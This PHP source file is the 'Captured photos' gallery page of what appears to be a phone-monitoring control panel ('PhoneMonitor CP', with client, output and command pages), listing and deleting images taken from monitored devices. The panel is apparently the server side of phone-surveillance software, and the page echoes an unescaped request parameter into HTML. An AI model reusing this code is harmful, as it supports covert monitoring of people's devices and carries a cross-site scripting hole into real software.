<?php
require_once('./authenticate.php');
?>
<html>
    <head>
        <meta charset="utf-8"> 
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <!-- Latest compiled and minified CSS -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css">

        <!-- jQuery library -->
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

        <!-- Popper JS -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.6/umd/popper.min.js"></script>

        <!-- Latest compiled JavaScript -->
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js"></script>

        <!-- Font awesome JavaScript -->
        <script src="https://use.fontawesome.com/53d43f5815.js"></script>
        <title>Captured photos</title>
    </head>
    <body>

        <nav class="navbar navbar-expand-sm navbar-dark bg-dark">
            <div class="navbar-brand">PhoneMonitor CP</div>
            <ul class="navbar-nav">
                <li class="nav-item"><a href="./clientlist.php" class="nav-link">Clients</a></li>
                <li class="nav-item"><a href="./outputlist.php" class="nav-link">Outputs</a></li>
                <li class="nav-item"><a href="./commandlist.php" class="nav-link">Commands</a></li>
            </ul>
            <ul class="navbar-nav ml-auto">
                <li class="nav-item">
                    <div class="dropdown">
                        <button type="button" class="btn btn-outline-secondary dropdown-toggle" data-toggle="dropdown"><?=$_SESSION['username']?> </button>
                        <div class="dropdown-menu dropdown-menu-right">
                            <a class="dropdown-item" href="./logout.php">Log out</a>
                        </div>
                    </div>
                </li>
            </ul>
        </nav>

        <style>
            div.gallery {
                margin: 5px;
                border: 1px solid #ccc;
                float: left;
                width: 180px;
            }

            div.gallery:hover {
                border: 1px solid #777;
            }

            div.gallery img {
                width: 100%;
                height: auto;
            }

            div.desc {
                padding: 2px;
                text-align: center;
                height: 50px;
            }
        </style>

        
            <?php
            include('./helperfuncs.php');
            
            $imagesarray=array();

            $files=scandir('./');
            if($files)
            {
                foreach($files as $file)
                {
                    if(!is_dir($file))
                    {
                        if(substr($file,-4)=='.jpg')
                        {
                            $extensionlessfilename=str_replace('.jpg','',$file);
                            $splitarray=preg_split('/_/',$extensionlessfilename);
                            if($splitarray && sizeof($splitarray)==2)
                            {
                                $safebase64deviceuid=$splitarray[0];
                                $safebase64timestamp=$splitarray[1];
                                $filedeviceuid=safeBase64Decode($safebase64deviceuid);
                                $filetimestamp=safeBase64Decode($safebase64timestamp);
                                if($filedeviceuid==$_GET['deviceuid'])
                                {
                                    $imagesarray[$filetimestamp]=$file;
                                }
                            }
                        }
                    }
                }
                if(krsort($imagesarray))//sort in descending order of timestamp
                {
                    date_default_timezone_set('Asia/Kathmandu');
                    foreach($imagesarray as $timestamp=>$filename)
                    {
                        echo("<div class='gallery'>
                        <a target='_blank' href='$filename'>
                        <img src='$filename' width='300' height='200'>
                        </a>
                        <div class='desc' data-deviceuid='".$_GET['deviceuid'].
                        "' data-timestamp='$timestamp'>".date('h:i:s a',$timestamp)."<br/>".date('D, M j, Y',$timestamp).
                        "</div>
                        </div>");
                    }
                }

            }
            
            ?>

            <script>
                var divDescText;
                var imagefileToBeDeleted_deviceuid;
                var imagefileToBeDeleted_timestamp;
                $(".desc").hover(
                    function(data){
                        divDescText=data.currentTarget.innerHTML;
                        imagefileToBeDeleted_deviceuid=data.currentTarget.getAttribute('data-deviceuid');
                        imagefileToBeDeleted_timestamp=data.currentTarget.getAttribute('data-timestamp');
                        data.currentTarget.innerHTML='<button type="button" class="btn btn-danger btn-block" style="height:100%" onclick="deleteImage()"><i class="fa fa-trash"></i> Delete</button>';  
                    },
                    function(data){
                        data.currentTarget.innerHTML=divDescText;
                    }
                );
                
                function deleteImage(){
                    $.post("./deleteimage.php",
                    {
                        "deviceuid":imagefileToBeDeleted_deviceuid,
                        "timestamp":imagefileToBeDeleted_timestamp
                    },
                    (data,status)=>{
                        if(status=="success"){
                            if(data=="Deleted"){
                                location.reload(true);
                            }
                        }
                    });
                }
            </script>
        
    </body>
</html>